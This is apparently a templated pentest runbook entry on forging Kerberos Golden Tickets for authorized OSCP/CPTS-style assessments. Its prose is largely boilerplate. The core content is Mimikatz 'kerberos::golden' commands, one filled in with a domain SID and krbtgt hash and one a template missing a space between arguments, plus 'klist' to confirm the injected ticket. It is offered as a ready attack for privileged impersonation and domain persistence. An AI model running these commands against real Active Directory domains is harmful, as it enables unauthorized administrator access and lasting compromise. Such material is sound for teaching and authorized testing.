title: Golden Ticket Forging and Validation
description: This runbook operationalizes Golden Ticket Forging and Validation using #kerberos . It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments. Generates forged Kerberos tickets for privileged impersonation and confirms injection success.

metadata.descriptionHtml:
This runbook operationalizes Golden Ticket Forging and Validation using #kerberos. It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments.

Generates forged Kerberos tickets for privileged impersonation and confirms injection success.

  1. Prepare scope and access: validate target reachability and select low-noise execution order.
  2. Execute core workflow: run the command chain to produce actionable security outcomes.
  3. Validate and operationalize output: confirm results, capture artifacts, and prepare follow-on actions.
  • Tool Location/Source: primary references are in local source corpus entries linked from runbook-list.md; e.g., docs/sources-runbooks/oscp-cpts/p0/0xsyr0-OSCP/README.md:3397; docs/sources-runbooks/oscp-cpts/p0/0xsyr0-OSCP/README.md:5951.
  • Attack pre-requisite: authorized scope, operator shell access, and protocol reachability on TCP/UDP 88.
  • What attacker gain: validated findings (access paths, credentials, execution context, or exposure evidence) enabling faster compromise progression.
  • Detection/Defense opsec: monitor abnormal auth/enumeration bursts, enforce least privilege and hardening baselines, and alert on repeated tool-pattern telemetry.

Core Commands:

kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf /id:500
kerberos::golden /domain:<DOMAIN>/sid:<SID> /rc4:<NTLMHASH> /user:<USERNAME> /service:<SERVICE> /target:<RHOST>
klist
